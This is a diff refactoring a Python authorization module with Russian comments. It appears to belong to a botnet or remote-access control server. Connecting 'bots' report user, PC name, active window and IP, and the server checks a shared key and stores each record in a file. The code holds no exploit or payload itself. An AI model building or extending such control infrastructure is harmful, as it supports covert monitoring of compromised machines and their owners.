@@ -1,90 +1,59 @@
 # backend/Services/Auth.py
 
-import asyncio
-import json
-import time
-from logs import Log as logger
-# Предполагаем, что AUTH_KEY импортирован корректно
-from backend import AUTH_KEY
+import asyncio, json, time
 from pathlib import Path
-
+from logs import Log as logger
+from backend import AUTH_KEY
 
 BOTS_FILE = Path(__file__).parent / "Bots_DB.txt"
+REQUIRED_FIELDS = ['id', 'loc', 'user', 'pc_name', 'activeWindow', 'last_active', 'ip', 'auth_key']
+MAX_PAYLOAD = 64 * 1024
 
 def quick_save_bot(bot_id, payload):
-    """Просто сохраняет JSON бота в файл"""
-    db = {}
-    # 1. Читаем старое, чтобы не удалить других ботов
-    if BOTS_FILE.exists():
-        try:
-            db = json.loads(BOTS_FILE.read_text(encoding="utf-8"))
-        except:
-            db = {}
-
-    # 2. Добавляем/обновляем нашего бота
-    db[bot_id] = payload
-
-    # 3. Сохраняем всё назад
-    BOTS_FILE.write_text(json.dumps(db, indent=4, ensure_ascii=False), encoding="utf-8")
-
-
-# ⚡️ ОБЯЗАТЕЛЬНЫЕ ПОЛЯ:
-REQUIRED_INFO_FIELDS = ['id', 'loc', 'user', 'pc_name', 'activeWindow', 'last_active', 'ip', 'auth_key']
-MAX_PAYLOAD = 64 * 1024  # 64 KB
-
+    """Обновляет данные бота в файловой базе."""
+    try:
+        db = json.loads(BOTS_FILE.read_text(encoding="utf-8")) if BOTS_FILE.exists() else {}
+        db[bot_id] = payload
+        BOTS_FILE.write_text(json.dumps(db, indent=4, ensure_ascii=False), encoding="utf-8")
+    except Exception as e:
+        logger.error(f"DB Write Error: {e}")
 
 async def authorize_client(reader: asyncio.StreamReader, ip_address: str):
     """
-    Пытается авторизовать клиента по TCP-потоку.
-    Сервер читает только длину payload и сам payload.
-    Возвращает кортеж (bot_id, original_payload_bytes) или None.
-
-    Ожидаемый формат: [Payload_len][Payload JSON Bytes]
+    Авторизация: [4 байта длины][JSON данные].
+    Возвращает (bot_id, payload_dict) или None.
     """
-
-    READ_TIMEOUT = 10
-    bot_id = ip_address  # Используем IP в случае ошибки
-
+    bot_id = ip_address
     try:
-        # 1. Чтение длины payload
-        payload_len_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=READ_TIMEOUT)
-        payload_len = int.from_bytes(payload_len_bytes, byteorder="big")
+        # 1. Получаем длину и сами данные (строго по протоколу)
+        raw_len = await asyncio.wait_for(reader.readexactly(4), 10)
+        payload_len = int.from_bytes(raw_len, "big")
 
-        # 2. Проверка размера payload
-        if payload_len <= 0 or payload_len > MAX_PAYLOAD:
-            logger.info(f"[!] Auth - недопустимый размер данных: {payload_len} байт от IP {ip_address}")
+        if not (0 < payload_len <= MAX_PAYLOAD):
+            raise ValueError(f"Invalid size: {payload_len}")
+
+        raw_data = await asyncio.wait_for(reader.readexactly(payload_len), 10)
+        data = json.loads(raw_data.decode('utf-8'))
+        
+        # 2. Валидация полей и ключа
+        bot_id = data.get('id', ip_address)
+        missing = [f for f in REQUIRED_FIELDS if f not in data]
+        
+        if missing:
+            logger.info(f"[!] Auth Fail: Missing fields {missing} from {ip_address}")
             return None
 
-        # 3. Чтение payload (сохраняем оригинальные байты)
-        original_payload_bytes = await asyncio.wait_for(reader.readexactly(payload_len), timeout=READ_TIMEOUT)
-
-        # 4. Проверка обязательных полей и ключа
-        payload_dict = json.loads(original_payload_bytes.decode('utf-8'))
-
-        # Проверка обязательных полей
-        if not all(field in payload_dict for field in REQUIRED_INFO_FIELDS):
-            missing_fields = [field for field in REQUIRED_INFO_FIELDS if field not in payload_dict]
-            logger.info(f"[!] Auth - отсутствуют обязательные поля: {missing_fields} от IP {ip_address}")
+        if data.get('auth_key') != AUTH_KEY:
+            logger.info(f"[!] Auth Fail: Wrong Key from {ip_address} ({bot_id})")
             return None
 
-        # Получение ID из payload
-        bot_id = payload_dict.get('id', ip_address)
-
-        # Проверка ключа аутентификации
-        if payload_dict.get('auth_key') != AUTH_KEY:
-            logger.info(f'[!] Auth - ошибка аутентификации ключа от IP {ip_address}, ID: {bot_id}')
-            return None
-
-        quick_save_bot(bot_id, payload_dict)
-
-        # 7. Возвращаем ID из payload и оригинальные БАЙТЫ Payload
-        return bot_id, payload_dict
+        # 3. Успех
+        quick_save_bot(bot_id, data)
+        return bot_id, data
 
     except (asyncio.TimeoutError, asyncio.IncompleteReadError):
-        logger.info(f'[!] Auth - таймаут соединения или неполное чтение от IP {ip_address}, ID: {bot_id}')
-    except (UnicodeDecodeError, json.JSONDecodeError):
-        logger.info(f'[!] Auth - ошибка декодирования/JSON при обработке данных от IP {ip_address}, ID: {bot_id}')
+        logger.info(f"[!] Auth Timeout/Incomplete from {ip_address}")
     except Exception as e:
-        logger.info(f'[!] Auth - неизвестная ошибка от IP {ip_address}, ID: {bot_id}: {type(e).__name__}: {e}')
+        logger.info(f"[!] Auth Error from {ip_address} ({bot_id}): {e}")
 
     return None
